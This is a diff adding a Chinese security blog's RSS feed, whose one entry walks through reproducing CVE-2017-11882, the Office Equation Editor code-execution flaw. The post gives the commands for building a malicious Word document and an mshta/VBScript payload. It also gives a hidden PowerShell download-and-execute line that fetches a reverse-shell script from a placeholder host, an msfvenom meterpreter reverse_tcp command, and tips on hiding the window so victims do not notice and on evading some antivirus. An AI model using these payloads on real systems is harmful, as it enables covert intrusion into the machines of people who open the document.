@@ -1,0 +1,102 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Office on 诗与胡说</title>
+    <link>https://kylingit.com/tags/office/index.xml</link>
+    <description>Recent content in Office on 诗与胡说</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>zh_cn</language>
+    <copyright>Copyright © 2018 kylinking</copyright>
+    <atom:link href="https://kylingit.com/tags/office/index.xml" rel="self" type="application/rss+xml" />
+    
+    <item>
+      <title>CVE-2017-11882 复现</title>
+      <link>https://kylingit.com/blog/cve-2017-11882-%E5%A4%8D%E7%8E%B0/</link>
+      <pubDate>Tue, 21 Nov 2017 18:40:29 +0000</pubDate>
+      
+      <guid>https://kylingit.com/blog/cve-2017-11882-%E5%A4%8D%E7%8E%B0/</guid>
+      <description>
+
+&lt;script src=&#34;https://ob5vt1k7f.qnssl.com/pangu.js&#34;&gt;&lt;/script&gt;
+
+&lt;p&gt;上周微软更新日，修复了&lt;code&gt;CVE-2017-11882&lt;/code&gt;这个漏洞，根据官方描述该漏洞为Office内存破坏漏洞，影响目前流行的所有Office版本，攻击者可以利用漏洞以当前登录的用户的身份执行任意命令。漏洞位置是出现在一个公式编辑器上，叫做&lt;code&gt;EQNEDT32.EXE&lt;/code&gt;，在win10上的路径是&lt;code&gt;C:\Program Files\Common Files\microsoft shared\EQUATION\EQNEDT32.EXE&lt;/code&gt;，可以在编辑文档的时候插入公式。&lt;/p&gt;
+
+&lt;p&gt;最近有利用脚本出来了，也是自己尝试复现了几次，在此简单记录一下&lt;/p&gt;
+
+&lt;p&gt;下载&lt;code&gt;https://github.com/Ridter/CVE-2017-11882/&lt;/code&gt;利用脚本，该脚本是&lt;a href=&#34;https://evi1cg.me/archives/CVE_2017_11882_exp.html&#34;&gt;@Evi1cg&lt;/a&gt;改造后的脚本，经过测试效果还是不错的&lt;/p&gt;
+
+&lt;p&gt;生成一个测试文档的话执行
+&lt;code&gt;python Command_CVE-2017-11882.py -c &amp;quot;cmd.exe /c calc.exe&amp;quot; -o test.doc
+&lt;/code&gt;
+打开test.doc就会弹出计算器，而且全程没有提示或警告之类的弹窗，可以算是完美利用，比之前&lt;a href=&#34;https://kylingit.com/blog/msword-code-exec-without-macro/&#34;&gt;不带宏的代码执行&lt;/a&gt;要简单粗暴&lt;/p&gt;
+
+&lt;p&gt;注意一点的是命令部分长度不能超过43bytes&lt;/p&gt;
+
+&lt;h4 id=&#34;反弹shell&#34;&gt;反弹shell&lt;/h4&gt;
+
+&lt;p&gt;下面主要讲一下反弹shell的利用&lt;/p&gt;
+
+&lt;p&gt;用mshta方式执行代码：
+在vps上建立一个文件&lt;code&gt;test&lt;/code&gt;，内容为&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;&amp;lt;HTML&amp;gt; 
+&amp;lt;meta http-equiv=&amp;quot;Content-Type&amp;quot; content=&amp;quot;text/html; charset=utf-8&amp;quot;&amp;gt;
+&amp;lt;HEAD&amp;gt; 
+&amp;lt;script language=&amp;quot;VBScript&amp;quot;&amp;gt;
+Set objShell = CreateObject(&amp;quot;Wscript.Shell&amp;quot;)
+objShell.Run &amp;quot;calc.exe&amp;quot;
+self.close
+&amp;lt;/script&amp;gt;
+&amp;lt;body&amp;gt;
+demo
+&amp;lt;/body&amp;gt;
+&amp;lt;/HEAD&amp;gt; 
+&amp;lt;/HTML&amp;gt; 
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;关键是修改&lt;code&gt;objShell.Run&lt;/code&gt;后面的部分&lt;/p&gt;
+
+&lt;p&gt;我们通过调用powershell下载一个反弹脚本然后执行的方式来获得shell：&lt;/p&gt;
+
+&lt;p&gt;修改&lt;code&gt;objShell.Run&lt;/code&gt;为&lt;/p&gt;
+
+&lt;p&gt;&lt;code&gt;objShell.Run powershell.exe -WindowStyle Hidden -NoP -sta -NonI -c IEX(New-Object System.Net.WebClient).DownloadString(&#39;http://ip/reverse.ps1&#39;);reverse.ps1&amp;quot;&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;其中&lt;code&gt;reverse.ps1&lt;/code&gt;通过&lt;code&gt;msfvenom&lt;/code&gt;生成:&lt;/p&gt;
+
+&lt;p&gt;&lt;code&gt;./msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=1234 -f psh-reflection &amp;gt;reverse.ps1&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;msf开启监听，然后生成word文档：
+&lt;code&gt;python Command_CVE-2017-11882.py -c &amp;quot;mshta http://ip/test&amp;quot; -o test.doc&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;打开之后就会收到shell&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/5TU1y&#34; alt=&#34;test&#34; /&gt;
+&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/KM1My&#34; alt=&#34;session 1&#34; /&gt;
+但是这样会有一个问题，打开word文档的时候会发现有一个黑框一闪而过，而我们已经指定powershell以&lt;code&gt;-WindowStyle Hidden&lt;/code&gt;的方式运行了，那怎么绕过这个黑框呢？&lt;/p&gt;
+
+&lt;p&gt;查一下&lt;a href=&#34;https://msdn.microsoft.com/en-us/library/d5fk67ky(en-us,VS.85).aspx&#34;&gt;文档&lt;/a&gt;
+可以看到&lt;code&gt;Run&lt;/code&gt;命令是可以通过&lt;code&gt;intWindowStyle&lt;/code&gt;参数来控制窗口风格的，有0-10这几种风格
+&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/q0F4b&#34; alt=&#34;Run Method&#34; /&gt;
+所以我们在执行的命令后面加一个参数，用来控制mshta运行的窗口大小，使之最好隐藏窗口运行
+&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/ccxgV&#34; alt=&#34;0&#34; /&gt;
+经过测试0和2参数都是可以的，达到隐藏窗口执行，用户察觉不了，其它参数可以自己试一下&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/qJKq7&#34; alt=&#34;session 3&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;目前这样生成的文档在火绒和360杀毒的最新版上是没有报毒，但是各大杀软已经更新了规则，凡是远程调用执行cmd或者ps或者regsvr32等都会触发报警，暂时没有好的方法绕过，毕竟是监控着底层的那几个文件的。&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/fzUuw&#34; alt=&#34;av&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;参考：&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&#34;https://evi1cg.me/archives/CVE_2017_11882_exp.html&#34;&gt;https://evi1cg.me/archives/CVE_2017_11882_exp.html&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&#34;http://www.freebuf.com/vuls/154462.html&#34;&gt;http://www.freebuf.com/vuls/154462.html&lt;/a&gt;&lt;/p&gt;
+
+&lt;script&gt;pangu.spacingPage();&lt;/script&gt;
+</description>
+    </item>
+    
+  </channel>
+</rss>
